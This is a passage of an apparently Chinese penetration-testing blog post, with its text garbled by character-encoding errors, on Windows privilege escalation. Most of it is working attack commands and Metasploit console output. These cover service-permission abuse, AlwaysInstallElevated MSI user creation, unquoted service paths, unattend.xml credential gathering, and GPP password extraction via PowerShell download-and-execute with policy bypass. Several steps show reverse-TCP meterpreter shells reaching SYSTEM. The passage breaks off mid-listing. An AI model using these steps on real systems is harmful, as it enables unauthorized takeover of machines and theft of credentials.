&#x27;mrxdav.sys&#x27; WebDAV</span><br><span class="line">MSBulletin : MS16-016</span><br><span class="line">CVEID      : 2016-0051</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/40085/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Secondary Logon Handle</span><br><span class="line">MSBulletin : MS16-032</span><br><span class="line">CVEID      : 2016-0099</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/39719/</span><br><span class="line">VulnStatus : Not Supported on single-core systems</span><br><span class="line"></span><br><span class="line">Title      : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MSBulletin : MS16-034</span><br><span class="line">CVEID      : 2016-0093/94/95/96</span><br><span class="line">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Win32k Elevation of Privilege</span><br><span class="line">MSBulletin : MS16-135</span><br><span class="line">CVEID      : 2016-7255</span><br><span class="line">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Nessus Agent 6.6.2 - 6.10.3</span><br><span class="line">MSBulletin : N/A</span><br><span class="line">CVEID      : 2017-7199</span><br><span class="line">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨"><a href="#0x02-windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨" class="headerlink" title="0x02.windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨"></a>0x02.windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨</h2><h3 id="1-ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"><a href="#1-ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯" class="headerlink" title="1.ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"></a>1.ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯</h3><blockquote><p>windows server å¯åˆ›å»ºé•¿ä¹…è¿è¡Œçš„å¯æ‰§è¡Œç¨‹åºï¼Œè‹¥èƒ½è·å–çš„ä¿®æ”¹windows serveré…ç½®æƒé™ï¼Œ é€šè¿‡æŠŠæœåŠ¡å¯åŠ¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºæ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥è·å¾—systemæƒé™</p><p>æœåŠ¡æœªè¿è¡Œï¼šä½¿ç”¨æ¶æ„ç¨‹åºæ›¿æ¢ï¼Œç„¶åé‡å¯æœåŠ¡<br>æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•ç»ˆæ­¢ï¼šç¬¦åˆç»å¤§å¤šæ•°çš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œä½¿ç”¨ DLLåŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡</p></blockquote><h4 id="01-PowerUp-ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´"><a href="#01-PowerUp-ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´" class="headerlink" title="01.PowerUp.ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´"></a>01.PowerUp.ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msfçš„exploit-windows-local-sercice-permissionsæ¨¡å—ææƒ"><a href="#02-msfçš„exploit-windows-local-sercice-permissionsæ¨¡å—ææƒ" class="headerlink" title="02.msfçš„exploit/windows/local/sercice_permissionsæ¨¡å—ææƒ"></a>02.msfçš„exploit/windows/local/sercice_permissionsæ¨¡å—ææƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2956 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;exit</span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/service_permissions </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt;    </span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/service_permissions):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)</span><br><span class="line">   SESSION     1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT     10               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[-] The registry technique will be skipped because the payload architecture does not match the native system architecture</span><br><span class="line">[*] Trying to add a new service...</span><br><span class="line">[*] Created service... CnoKgsk</span><br><span class="line">[+] Service should be started! Enjoy your new SYSTEM meterpreter session.</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49169) at 2021-07-28 09:16:46 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2832 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ"><a href="#2-æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ" class="headerlink" title="2.æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ"></a>2.æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ</h3><blockquote><p>åŸå› ï¼šå¼€å¯äº†windows installer ç‰¹æƒå®‰è£…åŠŸèƒ½</p><p>cmdè¾“å…¥gpedit.mscâ€”â€”è®¡ç®—æœºé…ç½®â€”â€”ç®¡ç†æ¨¡å—â€”â€”windowsç»„ä»¶â€”â€”windows installer</p><p>cmdè¾“å…¥gpedit.mscâ€”â€”ç”¨æˆ·é…ç½®â€”â€”ç®¡ç†æ¨¡å—â€”â€”windowsç»„ä»¶â€”â€”windows installer</p></blockquote><h4 id="01-powerupåˆ©ç”¨"><a href="#01-powerupåˆ©ç”¨" class="headerlink" title="01.powerupåˆ©ç”¨"></a>01.powerupåˆ©ç”¨</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">powerupä¸‹çš„Get-RegistryAlwaysInstallElevatedæ¨¡å—æ£€æŸ¥æ³¨å†Œè¡¨é”®æ˜¯å¦è¢«è®¾ç½®</span><br><span class="line">å¦‚æœè¢«è®¾ç½®åˆ™æ„å‘³MSIæ–‡ä»¶æ˜¯ä»¥systemæƒé™ä¸‹èƒ½è¿è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ£€æŸ¥æ˜¯å¦è¢«è®¾ç½®</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Get-RegistryAlwaysInstallElevated</span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿è¡ŒWrite-UserAddMSIæ¨¡å—ï¼Œç”ŸæˆMSIæ–‡ä»¶</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Write-UserAddMSI</span><br><span class="line"><span class="meta">#</span><span class="bash"> æ‰§è¡ŒMSIæ–‡ä»¶</span></span><br><span class="line">msiexec /quiet /qn /i UserAdd.msi</span><br></pre></td></tr></table></figure><img src="/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210728215541363.png" class><h4 id="02-msfçš„exploit-windows-local-always-install-elevatedæ¨¡å—ææƒ"><a href="#02-msfçš„exploit-windows-local-always-install-elevatedæ¨¡å—ææƒ" class="headerlink" title="02.msfçš„exploit/windows/local/always_install_elevatedæ¨¡å—ææƒ"></a>02.msfçš„exploit/windows/local/always_install_elevatedæ¨¡å—ææƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/service_permissions) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49171) at 2021-07-28 09:43:34 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 936 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"><a href="#3-å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´" class="headerlink" title="3.å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"></a>3.å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</h3><blockquote><p>Trusted Service Pathsæ¼æ´åˆ©ç”¨äº†windowsæ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ï¼Œé€šä¿—çš„è¯´ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼ˆå¸¦ç©ºæ ¼ï¼‰å¹¶ä¸”æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æœ‰æ¼æ´ã€‚</p><p>ä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ªæ–‡ä»¶è·¯å¾„C:\Program Files\Some Folder\Service.exeï¼Œæ“ä½œç³»ç»Ÿä¼šå¯¹æ–‡ä»¶è·¯å¾„ä¸­ç©ºæ ¼çš„æ‰€æœ‰å¯èƒ½æƒ…å†µè¿›è¡Œå°è¯•ï¼Œç›´è‡³æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤ŸåŒ¹é…çš„ç¨‹åºã€‚</p><p>æœ¬ä¾‹ä¸­ä¼šä¾æ¬¡å°è¯•æ‰§è¡Œä»¥ä¸‹ç¨‹åºï¼š</p><p>C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe</p><p>å¦‚æœæˆ‘ä»¬åœ¨Cç›˜ä¸Šä¼ ä¸€ä¸ªåä¸ºProgram.exeçš„æ¶æ„ç¨‹åºï¼Œå¯èƒ½å°±ä¼šä»¥systemæƒé™æ‰§è¡Œè¯¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p></blockquote><h4 id="01-æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨"><a href="#01-æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨" class="headerlink" title="01.æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨"></a>01.æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;    #æŸ¥æ‰¾æ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥çš„æœåŠ¡</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files (x86)&quot;    #æ£€æµ‹ç›®æ ‡æ–‡ä»¶å¤¹æ˜¯å¦æœ‰å†™æƒé™</span><br><span class="line">Everyone:ç”¨æˆ·å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å…·æœ‰ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶å¤¹çš„æƒé™</span><br><span class="line">(M):ä¿®æ”¹</span><br><span class="line">(F):å®Œå…¨æ§åˆ¶</span><br><span class="line">(CI):ä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹</span><br><span class="line">(OI):ä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹</span><br><span class="line">Everyone:(OI)(CI)(F):å¯¹è¯¥æ–‡ä»¶å¤¹ï¼Œç”¨æˆ·æœ‰è¯»ã€å†™ã€åˆ é™¤ã€ä¸‹è½½å…¶æ–‡ä»¶ã€åˆ é™¤å…¶å­ç›®å½•çš„æƒé™</span><br><span class="line"></span><br><span class="line">ç¡®è®¤å­˜åœ¨æ­¤æ¼æ´ï¼ŒæŠŠè¦ä¸Šä¼ çš„ç¨‹åºé‡å‘½ä»¤å¹¶æ”¾ç½®åœ¨å­˜åœ¨æ­¤æ¼æ´ä¸”å¯å†™çš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:</span><br><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><h4 id="02-msfåˆ©ç”¨"><a href="#02-msfåˆ©ç”¨" class="headerlink" title="02.msfåˆ©ç”¨"></a>02.msfåˆ©ç”¨</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/trusted_service_path):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; run</span><br><span class="line"></span><br><span class="line">[-] The Windows::WindowsServices mixin is deprecated, use Windows::Services instead</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Finding a vulnerable service...</span><br><span class="line">[-] Exploit failed: NameError undefined local variable or method `service_list&#x27; for #&lt;Msf::Modules::Exploit__Windows__Local__Trusted_service_path::Metasploit3:0x00007fca71a280d0&gt;</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿™é‡Œæ²¡æœ‰åˆ©ç”¨æˆåŠŸ</span></span><br></pre></td></tr></table></figure><h3 id="4-è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶"><a href="#4-è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶" class="headerlink" title="4.è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶"></a>4.è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml    #æœç´¢Unatted.xmlæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><code>msfæŸ¥æ‰¾</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/enum_unattend </span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_unattend):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   GETALL   true             yes       Collect all unattend.xml that are found</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Reading C:\Windows\panther\unattend.xml</span><br><span class="line">[+] Raw version of C:\Windows\panther\unattend.xml saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_989482.txt</span><br><span class="line">Unattend Credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> Type   Domain  Username        Password  Groups</span><br><span class="line"> ----   ------  --------        --------  ------</span><br><span class="line"> auto           administration</span><br><span class="line"> local          administration</span><br><span class="line"></span><br><span class="line">[+] Unattend Credentials saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_206680.txt</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; </span><br></pre></td></tr></table></figure><h3 id="5-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#5-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="5.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>5.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><code>AccessChkä½¿ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula    #é¦–æ¬¡ä½¿ç”¨æ¥å—è®¸å¯ï¼Œé»˜è®¤å¼¹æ¡†</span><br><span class="line">accesschk.exe -dqv &quot;C:\Windows&quot;    #æŸ¥çœ‹ç›®å½•æƒé™é…ç½®</span><br><span class="line">accesschk.exe -uwdqsUsers&quot;AuthenticatedUsers&quot;c:\*.* #åˆ—å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="0x03-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"><a href="#0x03-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ" class="headerlink" title="0x03.ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"></a>0x03.ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ</h2><h3 id="1-è·å–ç»„ç­–ç•¥å‡­æ®-SYSVOL-GPP"><a href="#1-è·å–ç»„ç­–ç•¥å‡­æ®-SYSVOL-GPP" class="headerlink" title="1.è·å–ç»„ç­–ç•¥å‡­æ®(SYSVOL/GPP)"></a>1.è·å–ç»„ç­–ç•¥å‡­æ®(SYSVOL/GPP)</h3><h4 id="01-powershellè·å–cpassword"><a href="#01-powershellè·å–cpassword" class="headerlink" title="01.powershellè·å–cpassword"></a>01.powershellè·å–cpassword</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msfè·å–"><a href="#02-msfè·å–" class="headerlink" title="02.msfè·å–"></a>02.msfè·å–</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 